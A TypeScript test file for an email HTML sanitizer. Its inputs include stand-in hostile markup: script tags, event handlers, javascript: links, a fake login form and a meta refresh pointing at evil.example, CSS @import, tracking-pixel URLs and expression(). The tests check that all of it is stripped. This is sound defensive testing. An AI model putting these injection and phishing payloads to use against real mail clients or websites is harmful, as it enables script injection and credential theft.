import { describe, expect, it } from "vitest";
import { sanitizeMailHtml } from "./sanitize";

describe("a message's HTML for the viewer", () => {
  it("loses its scripts, its forms and their controls, its frames, and its handlers, and keeps its design", () => {
    const hostile = [
      '<html><head><title>Hi</title><script>steal()</script><meta http-equiv="refresh" content="0;url=https://evil.example"></head><body>',
      '<table width="600" style="background:#fff;border:1px solid #ddd"><tr><td class="hero" onclick="steal()">Hello <b>there</b></td></tr></table>',
      '<form action="https://evil.example/login"><input name="password"><button>Sign in</button></form>',
      '<iframe src="https://evil.example"></iframe><object data="x.swf"></object><embed src="x.swf">',
      '<img src="https://cdn.example/logo.png" alt="Logo" onerror="steal()"><img src="javascript:steal()">',
      '<a href="javascript:steal()">Bad</a> <a href="https://shop.example/offer">Offer</a>',
      '<svg><script>steal()</script></svg>',
      "</body></html>",
    ].join("");
    const clean = sanitizeMailHtml(hostile);
    for (const gone of ["<script", "steal", "<form", "<input", "<button", "<iframe", "<object", "<embed", "<meta", "onclick", "onerror", "javascript:", "<svg", "evil.example", "Sign in"]) {
      expect(clean.html, gone).not.toContain(gone);
    }
    expect(clean.html).toContain('<table width="600" style="background:#fff;border:1px solid #ddd">');
    expect(clean.html).toContain('<td class="hero">Hello <b>there</b></td>');
    expect(clean.html).toContain('<img src="https://cdn.example/logo.png" alt="Logo">');
    expect(clean.html).toContain('<a href="https://shop.example/offer" target="_blank" rel="noopener noreferrer">Offer</a>');
    expect(clean.removed.handlers).toBe(2);
    // Each element dropped with what is inside it counts once: the head (its title, script, and meta with it), the form,
    // the frame, the object, the embed, and the drawing.
    expect(clean.removed.elements).toBe(6);
    expect(clean.remoteImages).toBe(1);
  });

  it("keeps a style sheet's rules and drops those that load or run something", () => {
    const clean = sanitizeMailHtml(
      '<style>@import url("https://evil.example/x.css"); .a { color: red } .b { background: url(https://track.example/p.gif) } .c { width: expression(alert(1)) } </style><p class="a" style="color: blue; background-image: url(https://track.example/q.gif)">Text</p>',
    );
    expect(clean.html).toContain(".a { color: red }");
    expect(clean.html).not.toContain("@import");
    expect(clean.html).not.toContain("track.example");
    expect(clean.html).not.toContain("expression");
    expect(clean.html).toContain('<p class="a" style="color: blue">Text</p>');
    // A style sheet cannot be ended from inside.
    expect(sanitizeMailHtml("<style>p { color: red }</style ><script>x()</script>").html).not.toContain("<script");
  });

  it("reads nothing as nothing, and plain markup as itself", () => {
    expect(sanitizeMailHtml(null)).toEqual({ html: "", removed: { elements: 0, handlers: 0, links: 0, styles: 0 }, remoteImages: 0 });
    expect(sanitizeMailHtml("<p>Plain &amp; simple</p>").html).toBe("<p>Plain &amp; simple</p>");
  });
});
